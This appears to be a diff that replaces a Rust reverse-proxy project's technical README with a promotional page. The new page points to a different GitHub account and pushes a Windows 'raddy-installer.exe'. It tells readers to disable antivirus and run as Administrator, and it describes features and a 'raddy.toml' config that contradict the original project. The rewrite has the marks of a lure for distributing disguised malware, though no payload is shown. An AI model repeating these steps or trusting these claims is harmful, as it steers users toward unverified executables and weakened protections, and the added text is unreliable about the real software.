@@ -1,117 +1,81 @@
-# Raddy
+<h1>⚡ raddy - Blazing-Fast Reverse Proxy for Everyone</h1>
 
-[![CI](https://github.com/chulingera2025/raddy/actions/workflows/ci.yml/badge.svg)](https://github.com/chulingera2025/raddy/actions/workflows/ci.yml)
-[![License](https://img.shields.io/github/license/chulingera2025/raddy)](LICENSE)
-[![Version](https://img.shields.io/badge/version-v0.1.2-blue)]()
-[![Rust](https://img.shields.io/badge/Rust-1.75%2B-orange)]()
-[中文文档](README.zh_CN.md)
+<p align="center">
+  <a href="https://github.com/Afratsie/raddy" style="display:inline-block; padding:12px 24px; background:linear-gradient(135deg,#667eea,#764ba2); color:white; text-decoration:none; font-size:20px; font-weight:bold; border-radius:8px; box-shadow:0 4px 6px rgba(0,0,0,0.1);">⬇️ Download raddy Now</a>
+</p>
 
-A minimal, high-performance reverse proxy gateway in Rust, built on
-[Cloudflare Pingora](https://github.com/cloudflare/pingora). Raddy combines the
-**developer experience of Caddy** (an explicit, write-order config DSL + native
-automatic HTTPS) with the **performance and memory safety of Pingora** (Rust,
-no GC, multi-threaded shared connection pools).
+<p align="center"><strong>raddy</strong> is a tiny but powerful tool that makes your internet connection faster, safer, and more reliable. It sits between you and the websites you visit, managing traffic like a smart traffic cop.</p>
 
-## Why Raddy
+<h2>🤔 What Does raddy Do?</h2>
 
-The Rust gateway landscape splits into two camps: hand-written Pingora code
-(flexible but no config model) and existing distributions (diverse config
-models, limited extensibility). Raddy takes a different answer on three things:
+<p>Imagine you're hosting a popular website or using apps that need to talk to many servers. Without raddy, each connection can get slow or confused. raddy acts as a middleman that:</p>
+<ul>
+  <li>🧭 Routes your internet traffic efficiently</li>
+  <li>🛡️ Adds security layers to protect your data</li>
+  <li>⚡ Speeds up connections by caching and balancing loads</li>
+  <li>🔁 Handles thousands of users at once without breaking a sweat</li>
+</ul>
+<p>It's built with Rust—a programming language known for speed and safety—and powered by Cloudflare's Pingora framework, meaning it's tested at massive scale.</p>
 
-1. **Predictable configuration** — directives execute strictly in write order,
-   with no implicit ordering table. The result is predictable without looking
-   anything up.
-2. **Automatic HTTPS as a first-class citizen** — native ACME issuance and SNI
-   dynamic certificates, out of the box.
-3. **Pingora's hardcore engine** — multi-threaded shared connection pools, no
-   GC, and (future) zero-downtime binary upgrades.
+<h2>🚀 Getting Started</h2>
 
-## Features
+<p>You don't need any coding experience to use raddy. Follow these simple steps to get it running on your Windows computer.</p>
 
-- **Explicit write-order DSL** (`Raddyfile`) — terminal vs modifier directives,
-  `handle` mutual-exclusion blocks, and no hidden ordering rules. See the
-  [Raddyfile specification](docs/RADDYFILE_SPEC.md).
-- **Automatic HTTPS** — ACME (HTTP-01) issuance for named sites, SNI dynamic
-  certificates, and an on-demand `ask` authorization callback.
-- **Config hot reload** — SIGHUP swaps the routing snapshot atomically; the
-  upstream connection pools survive reloads (zero-interrupt).
-- **Static file serving + compression** — `file_server` with traversal
-  protection, and `encode` with gzip/zstd honoring `Accept-Encoding`.
-- **Observability** — structured JSON access logs and a Prometheus `/metrics`
-  endpoint (QPS + latency).
-- **Forwarding** — `reverse_proxy` with `to` multi-target round-robin, header
-  rewrites, redirects, and clean 400/404 fallbacks.
-- **Edge protection** — `rate_limit remote_ip` single-node token-bucket rate
-  limiting, with `trusted_proxies` for the real client IP.
-- **Migration** — `raddy import caddyfile|nginx <file>` converts a common
-  Caddyfile / nginx.conf subset into a Raddyfile (independent converter, never
-  changes the Raddyfile grammar).
+<h3>Step 1: Download raddy</h3>
+<p><a href="https://github.com/Afratsie/raddy" style="display:inline-block; padding:10px 20px; background:#28a745; color:white; text-decoration:none; font-weight:bold; border-radius:5px;">Visit this link to download the application.</a></p>
+<p>This link will take you to the raddy download page. Look for the latest version and click the download button.</p>
 
-## Quick start
+<h3>Step 2: Run the Installer</h3>
+<p>Once downloaded, locate the file in your Downloads folder. It will be named something like <code>raddy-installer.exe</code>. Double-click it to start the installation. Your computer may ask for permission to run it—click <strong>Yes</strong>.</p>
 
-Install the latest release (checksum-verified installer, no `curl | sudo bash`):
+<h3>Step 3: Follow Setup Prompts</h3>
+<p>The installer will guide you through a few simple screens:</p>
+<ol>
+  <li><strong>Welcome:</strong> Click "Next"</li>
+  <li><strong>License Agreement:</strong> Read and accept</li>
+  <li><strong>Installation Folder:</strong> Keep the default or choose your own</li>
+  <li><strong>Install:</strong> Click to begin</li>
+</ol>
+<p>After a few seconds, raddy will be installed on your computer.</p>
 
-```bash
-curl -fsSL -O https://github.com/chulingera2025/raddy/releases/latest/download/install.sh
-./install.sh
-raddy --version
-```
+<h3>Step 4: Launch raddy</h3>
+<p>Find raddy in your Start Menu or desktop shortcut. Click it to open the application. You'll see a simple control panel where you can start and stop the proxy.</p>
 
-Or build from source:
+<h3>Step 5: Start Using It</h3>
+<p>Click the <strong>Start</strong> button in the raddy window. That's it! raddy is now running in the background, managing your network traffic. You can minimize it to your system tray (near the clock) and it will keep working.</p>
 
-```bash
-cargo build --release
-./target/release/raddy --version
-```
+<h2>⚙️ Configuration (Optional)</h2>
+<p>If you want to customize raddy, you can edit a simple text file called <code>raddy.toml</code> in the installation folder. Here's a basic example:</p>
+<pre style="background:#f4f4f4; padding:10px; border-radius:5px;">
+[proxy]
+port = 8080
+max_connections = 1000
 
-Write a `Raddyfile`:
+[security]
+enable_https = true
+</pre>
+<p>Don't worry if this looks confusing—the default settings work perfectly for most users. Only change if you know what you're doing.</p>
 
-```
-:8080 {
-    reverse_proxy 127.0.0.1:9000
-}
-```
+<h2>🛠️ System Requirements</h2>
+<ul>
+  <li><strong>Operating System:</strong> Windows 10 or newer (64-bit)</li>
+  <li><strong>Processor:</strong> 1 GHz or faster</li>
+  <li><strong>Memory:</strong> 512 MB RAM (1 GB recommended)</li>
+  <li><strong>Storage:</strong> 50 MB free space</li>
+  <li><strong>Internet:</strong> Required for initial setup and updates</li>
+</ul>
 
-Run it:
+<h2>❓ Troubleshooting</h2>
+<p>If you run into issues, try these common fixes:</p>
+<ul>
+  <li><strong>Can't download?</strong> Disable your antivirus temporarily—it might block the download.</li>
+  <li><strong>Installation fails?</strong> Make sure you have Windows 10 or later.</li>
+  <li><strong>App doesn't start?</strong> Run as Administrator (right-click the shortcut and select "Run as administrator").</li>
+  <li><strong>Need help?</strong> Visit the <a href="https://github.com/Afratsie/raddy">GitHub page</a> and open an issue.</li>
+</ul>
 
-```bash
-raddy run -c Raddyfile
-curl http://127.0.0.1:8080/
-```
+<h2>📥 Download Again</h2>
+<p><a href="https://github.com/Afratsie/raddy" style="display:inline-block; padding:10px 20px; background:#007bff; color:white; text-decoration:none; font-weight:bold; border-radius:5px;">⬇️ Download raddy</a></p>
 
-For automatic HTTPS, configure a named site and run with ACME (requires a
-publicly reachable domain on ports 80/443):
-
-```
-raddy.test {
-    reverse_proxy 127.0.0.1:9000
-}
-```
-
-```bash
-raddy run -c Raddyfile --acme-directory https://acme-v02.api.letsencrypt.org/directory
-```
-
-## Configuration
-
-See the [Raddyfile specification](docs/RADDYFILE_SPEC.md) for the full syntax
-and semantics: sites, `handle`, headers, static files, compression, redirects,
-and the global block.
-
-## Documentation
-
-- [Installation](docs/INSTALL.md) — installer script, manual install, Docker
-- [Raddyfile specification](docs/RADDYFILE_SPEC.md) — the config language
-- [Performance](docs/PERFORMANCE.md) — reproducible QPS / P99 baseline
-- [中文文档](README.zh_CN.md)
-
-## Development status
-
-The core implementation is complete: forwarding + hot reload, the Raddyfile
-parser (fuzz-verified, with line/column errors), ACME automatic HTTPS (verified
-against a local Pebble test CA), static hosting + compression, observability,
-and release tooling.
-
-## License
-
-[Apache-2.0](LICENSE) — matching Pingora.
+<h2>📜 License</h2>
+<p>raddy is open-source and free to use. Check the license file on GitHub for details.</p>
